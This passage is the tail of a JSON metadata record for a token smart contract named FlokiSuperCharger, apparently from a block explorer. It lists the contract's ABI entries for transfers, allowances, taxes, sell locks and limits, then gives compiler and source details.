:\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balanceLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"AddressToCheck\",\"type\":\"address\"}],\"name\":\"getAddressSellLockTimeInSeconds\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBurnedTokens\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLimits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sell\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLiquidityReleaseTimeInSeconds\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getSellLockTimeInSeconds\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTaxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"burnTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketingTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"buyTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sellTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"transferTax\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualConversion\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLockDisabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLockTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLPBNB\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "FlokiSuperCharger", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://47d1867931dbf0a4abb5ce7b299e3f31cbd380a6e9eea6ab926a7c61199556fa"}